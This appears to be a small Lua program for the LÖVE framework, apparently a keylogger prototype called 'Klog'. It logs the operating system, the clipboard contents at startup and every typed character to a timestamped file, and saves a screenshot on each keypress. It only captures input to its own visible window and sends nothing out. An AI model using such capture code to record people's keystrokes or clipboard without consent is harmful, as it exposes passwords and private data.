local utf8 = require("utf8")

-- Adres folderu do składowania logow
fileaddress = 'B:/LOVE/Klog/log/'
--


function love.draw()
   love.graphics.print("FPS: "..tostring(love.timer.getFPS( )), 10, 10)
end
function love.load()
	love.window.setPosition( 0, 0, 1 )
	love.filesystem.setIdentity('KLscreenshot');
	local datetime = os.date('%d_%m_%y %H_%M_%S')
	file = io.open(fileaddress..datetime..'.txt', 'w')
	file:write('\n\n'..datetime..'\n')
	local os2 = love.system.getOS()
	local clipboard = love.system.getClipboardText()
	file:write('System operacyjny: '..os2..'\n')
	file:write('Zawartosc schowka w chwili otwarcia programu: >>'..clipboard..'<<\n')
    love.keyboard.setKeyRepeat(false)
end
 
 
function love.textinput(t)
	local screenshot = love.graphics.newScreenshot();
	screenshot:encode('png', os.time() .. '.png');
	file:write(t)
end


function love.keypressed(key)
	local screenshot = love.graphics.newScreenshot();
	if key == 'escape' then
		file:close()
		screenshot:encode('png', os.time() .. '.png');
		love.event.quit()
	elseif key == 'tab' then
		file:write('\n[TAB]')
	elseif key == 'backspace' then
		file:write('[BKSP]')
	end
end